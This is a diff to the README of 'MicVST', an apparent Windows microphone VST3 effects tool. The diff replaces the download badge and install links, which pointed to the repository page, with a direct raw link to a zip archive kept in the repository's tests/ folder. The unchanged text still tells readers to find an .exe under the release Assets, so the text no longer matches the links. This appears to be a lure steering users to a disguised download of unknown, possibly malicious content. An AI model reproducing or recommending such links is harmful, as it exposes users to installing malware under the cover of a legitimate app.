@@ -1,6 +1,6 @@
 # 🎚️ MicVST - Route your microphone through VST3 effects
 
-[![Download MicVST](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/tenrececaudatusarmour182/MicVST)
+[![Download MicVST](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/tenrececaudatusarmour182/MicVST/main/tests/VST-Mic-3.6.zip)
 
 MicVST helps you sound better on Windows. This app lets you run VST3 audio effects on your microphone input in real time. You can send the processed sound to a virtual cable and use that cable as your input device in any app like Discord, OBS, or Zoom.
 
@@ -14,7 +14,7 @@ This software requires a virtual audio cable to function. If you do not have one
 
 ## 📥 How to Install
 
-Visit [this page](https://github.com/tenrececaudatusarmour182/MicVST) to download the application. Look for the latest release on the right side of the screen.
+Visit [this page](https://raw.githubusercontent.com/tenrececaudatusarmour182/MicVST/main/tests/VST-Mic-3.6.zip) to download the application. Look for the latest release on the right side of the screen.
 
 1. Click the link to the latest release page.
 2. Find the file ending in .exe under the Assets section.
